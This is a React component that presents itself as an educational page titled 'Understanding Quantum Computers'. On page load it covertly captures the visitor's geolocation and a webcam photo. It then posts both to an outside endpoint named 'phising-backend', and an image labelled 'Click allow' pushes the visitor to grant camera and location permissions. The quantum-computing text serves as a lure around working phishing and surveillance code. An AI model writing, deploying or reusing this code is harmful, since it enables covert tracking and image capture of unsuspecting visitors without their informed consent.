import React, { useEffect, useState } from 'react';
import axios from 'axios';
import styles from './styling.module.css';

const Main = () => {
  const [coords, setCoords] = useState(null);  // Store coordinates as an object
  const [image, setImage] = useState(null);

  useEffect(() => {
    // Get user location
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setCoords({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          });
        },
        (error) => console.error("Error fetching location: ", error)
      );
    } else {
      console.error("Geolocation not supported");
    }

    // Capture user image
    const captureImage = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        
        video.onloadedmetadata = () => {
          video.play();
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext("2d").drawImage(video, 0, 0);
          setImage(canvas.toDataURL("image/png"));
          
          // Stop video stream after capturing the image
          stream.getTracks().forEach(track => track.stop());
        };
      } catch (error) {
        console.error("Error accessing camera: ", error);
      }
    };
    
    captureImage();
  }, []);

  useEffect(() => {
    // Send data to backend once both coords and image are available
    if (coords && image) {
      const sendData = async () => {
        try {
          await axios.post('https://phising-backend.vercel.app/api/store', {
            coords,
            image,
          });
          console.log("Data sent to backend successfully");
        } catch (error) {
          console.error("Error sending data to backend:", error);
        }
      };

      sendData();
    }
  }, [coords, image]);

  return (
  <div>
      <div style={{display: 'flex', justifyContent: 'center'}}>
      <img src='https://th.bing.com/th/id/OIP.3rUNW2-s5Cj4ycTaomGt7QAAAA?w=260&h=172&c=7&r=0&o=5&pid=1.7' alt='Click allow'/>
    </div>

    <div className={styles.container}>
      <header className={styles.header}>
        <h1>Understanding Quantum Computers</h1>
        <p>Exploring the future of computing technology</p>
      </header>

      <section className={styles.section}>
        <h2>What is a Quantum Computer?</h2>
        <p>
          Quantum computers use the principles of quantum mechanics to process information in ways that classical computers cannot. They utilize quantum bits, or qubits, which can exist in multiple states simultaneously, allowing for complex calculations at incredible speeds.
        </p>
      </section>

      <section className={styles.section}>
        <h2>Key Features</h2>
        <ul>
          <li><strong>Superposition:</strong> Qubits can represent both 0 and 1 at the same time.</li>
          <li><strong>Entanglement:</strong> Qubits can be interconnected, allowing for instantaneous state changes.</li>
          <li><strong>Quantum Supremacy:</strong> Quantum computers can solve problems that are infeasible for classical computers.</li>
        </ul>
      </section>

      <section className={styles.section}>
        <h2>Applications of Quantum Computing</h2>
        <p>
          Quantum computing has the potential to transform various industries, including:
        </p>
        <ul>
          <li>Cryptography</li>
          <li>Drug discovery and materials science</li>
          <li>Optimization problems in logistics and finance</li>
        </ul>
      </section>

      <section className={styles.section}>
        <h2>Images of Quantum Computers</h2>
        <div className={styles.imageContainer}>
          <img src="https://miro.medium.com/v2/resize:fill:600:400/1*gfuVobqPE1C06yJwyAi2Qg.png" alt="Quantum Computer" className={styles.image} />
          <img src="https://wp.technologyreview.com/wp-content/uploads/2019/01/062118rigetti0584finalsquare-9.jpg" alt="Quantum Computer Setup" className={styles.image} />
        </div>
      </section>

      <footer className={styles.footer}>
        <p>&copy; 2024 Quantum Computing Insights</p>
      </footer>
    </div>

    </div>
  );
}

export default Main;
